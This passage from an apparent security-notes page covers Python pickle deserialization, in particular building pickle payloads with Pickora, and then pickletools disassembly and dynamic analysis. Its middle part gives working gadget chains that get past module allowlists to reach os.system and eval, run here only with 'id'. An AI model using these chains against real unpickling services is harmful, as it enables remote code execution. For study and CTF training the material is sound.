* Define variables with common types like `string`, `number`, `list`, `tuple` or `dict`
* Attribute assignment like `dict_['x'] = 1337`
* Function calls like `f(arg1, arg2)`
* Import modules using `from module import something` syntax
* Manually import more complex objects using `GLOBAL("module", "path.to.something")`

The next section will use the Pickora syntax to easily create pickle data, which can be compiled like so:

<pre class="language-bash"><code class="lang-bash"><strong>pickora -c 'from system import os; system("id")' -o output.pkl
</strong># or from a source file:
echo -e 'from system import os\nsystem("id")' > payload.py
<strong>pickora payload.py -o output.pkl
</strong># then test it using the pickle module:
<strong>python -m pickle output.pkl
</strong></code></pre>

#### Bypassing Filters

We will look at the example filter from above to bypass it in various general ways. \
Firstly, while the allowed `random` module does not contain directly dangerous functions, it imports some modules like `import os as _os`. This is a property path that we can include in the `GLOBAL` opcode as the name of the class, separated by `.` dots. This way we can access the `os` module like before, but through the `random` module to bypass the filter:

```python
GLOBAL("random", "_os.system")("id")
```

Secondly, there is another module allowed named `builtins`. `exec` and `eval` are blocked, but more dangerous functions exist in the module like `__import__` to import `os` again. However, we cannot just access the `.system` function on it to run a command. This is not possible in pickle opcodes. Instead, we can call the `builtins.getattr` function as it is also not blocked, with the property we want to access on the `os` module:

```python
from builtins import getattr, __import__
getattr(__import__("os"), "system")("id")
```

Thirdly, the seemingly insignificant `collections` module is also allowed to be imported from. One trick we can perform on any module is importing their `.__builtins__` attribute and calling `__getitem__` on it to recover a builtin like `eval`:

```python
eval = GLOBAL("collections", "__builtins__.__getitem__")('eval')
eval("__import__('os').system('id')")
```

Lastly, if we weren't allowed to use the `builtins` module, or the `__builtins__` attribute, we can still use any module to recover the builtins. The clever trick is to temporarily save a value as an attribute on the module using `__setattr__`, to be able to access it later with another `GLOBAL` opcode. We can then import the `__getitem__` method on such a saved object and call it to access any dictionary key which normally wouldn't be possible in pickle opcodes. This combined with `__builtins__` allows us to get back to `eval` again:

{% code title="Abuse any module" %}
```python
setattr = GLOBAL("random", "__setattr__")
# Get to <class 'object'> using any property on the module
subclasses = GLOBAL(
    "random",
    "BPF.__class__.__base__.__subclasses__"
)()
setattr("subclasses", subclasses)  # Save as attribute on the module

# Access saved variable from the module and call __getitem__ method
gadget = GLOBAL(
    "random",
    "subclasses.__getitem__"
)(103)  # Need to get any <function> type
setattr("gadget", gadget)  # Save this gadget to use later

# Get the globals and then builtins from this gadget
builtins = GLOBAL(
    "random",
    "gadget.__init__.__globals__.__getitem__"
)('__builtins__')
setattr("builtins", builtins)  # Save it for dictionary access

# Access the final object to find __getitem__ on __builtins__ and call eval
eval = GLOBAL(
    "random",
    "builtins.__getitem__"
)('eval')
eval("__import__('os').system('id')")
```
{% endcode %}

{% hint style="info" %}
**Note**: If you are able to import any _function_, you can significantly reduce the complexity of this bypass by accessing its globals and the `.get()` method, [like explained in this writeup](https://darkdrag0nite.medium.com/htb-cyber-apocalypse-2024-were-pickle-phreaks-revenge-f45933d3ee13)

```python
dict_get = GLOBAL("random", "choices.__globals__.__class__.get")
globals = GLOBAL("random", "choices.__globals__")
builtins = dict_get(globals, "__builtins__")
eval = dict_get(builtins, "eval")
eval("__import__('os').system('id')")
```
{% endhint %}

### Reverse Engineering

You might find a serialized piece of pickle data, but without source code, it may be difficult to understand what it exactly means. There are a few **plaintext strings** inside the serialized data that can give an idea of what it is about. To get a full understanding of everything some more analysis is required, but luckily there exist tools that help with this.&#x20;

#### Static Analysis

The [`pickletools`](https://docs.python.org/3/library/pickletools.html) library contains useful functions for analyzing pickled data and can disassemble the opcodes to get a better understanding of the binary data:

{% code title="Source" %}
```python
with open('something.pkl', 'wb') as f:
    pickle.dump((1, 2), f)  # Pickle of (1, 2) tuple
```
{% endcode %}

<pre class="language-shell-session" data-title="CLI Disassembly"><code class="lang-shell-session"><strong>$ python3 -m pickletools something.pkl -a
</strong>    0: \x80 PROTO      4              Protocol version indicator.
    2: \x95 FRAME      7              Indicate the beginning of a new frame.
   11: K    BININT1    1              Push a one-byte unsigned integer.
   13: K    BININT1    2              Push a one-byte unsigned integer.
   15: \x86 TUPLE2                    Build a two-tuple out of the top two items on the stack.
   16: \x94 MEMOIZE    (as 0)         Store the stack top into the memo.  The stack is not popped.
   17: .    STOP                      Stop the unpickling machine.
highest protocol among opcodes = 4
</code></pre>

{% code title="From Python" %}
```python
with open('something.pkl', 'rb') as f:
    pickletools.dis(f)  # Disassemble and print to STDOUT
```
{% endcode %}

This disassembly works with pushing and popping from the **stack**. This is more clear with a nested expression like `(1, [2, 3])`:

```
11: K    BININT1    1              Push a one-byte unsigned integer.
13: ]    EMPTY_LIST                Push an empty list.
14: \x94 MEMOIZE    (as 0)         Store the stack top into the memo.  The stack is not popped.
15: (    MARK                      Push markobject onto the stack.
16: K        BININT1    2          Push a one-byte unsigned integer.
18: K        BININT1    3          Push a one-byte unsigned integer.
20: e        APPENDS    (MARK at 15) Extend a list by a slice of stack objects.
21: \x86 TUPLE2                      Build a two-tuple out of the top two items on the stack.
22: \x94 MEMOIZE    (as 1)           Store the stack top into the memo.  The stack is not popped.
```

Here, a `1` integer is pushed on the stack, then an empty list is pushed too. The numbers `2` and `3` are added to a "markobject" and at the end the list is extended by this slice. This leaves the integer `1` and the list on the top of the stack, which is turned into a tuple from the 2 topmost stack items using `TUPLE2`.&#x20;

A common opcode is `MEMOIZE`, which stores the stack top in a special place for reuse later on. These can then be referenced further in the data so it does not have to be repeated.&#x20;

#### Dynamic Analysis

{% hint style="warning" %}
**Warning**: As shown above, deserializing _any_ pickle payload can lead to Arbitrary Code Execution, so be careful what you deserialize while reverse engineering! If you have any reason for suspicion, try it in a safe environment like a VM first.
{% endhint %}

While static analysis can give a decent idea, you can see a lot quickly when simply running the code in the pickled data. To get only the result of a deserialization, run:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ python3 -m pickle x.pickle
</strong>(1, 2)
</code></pre>

You can play with the result if it is more complex in a Python console:

<pre class="language-python" data-overflow="wrap"><code class="lang-python"><strong>>>> import pickle
</strong><strong>>>> p = pickle.load(open("something.pkl", "rb"))
</strong>(1, 2)
<strong>>>> p[1]
</strong>2
<strong>>>> dir(p)
</strong>['__add__', '__class__', '__contains__', ..., '__subclasshook__', 'count', 'index']
</code></pre>

{% hint style="warning" %}
Some pickled data requires custom classes to be defined, which it sets properties on or initializes in other ways. These need to be defined in the context before deserializing or it will throw an error with the missing class name. if these are unknown try doing more [#static-analysis](python.md#static-analysis "mention")
{% endhint %}

To view more of the steps involved, try following the `load()` call in a **debugger** like VSCode, which will decompile some pieces of code visually and show intermediate variables. If a pickle object requires more steps to be created, this can give a great idea of those steps.

If you find your mystery object has **functions** defined (common with machine learning models), the [`inspect.getsource()`](https://docs.python.org/3/library/inspect.html#inspect.getsource) function may be able to recreate the source code for the function in question. The more low-level [`dis.dis()`](https://docs.python.org/3/library/dis.html#dis.dis) function can give you disassembled bytecode instead.
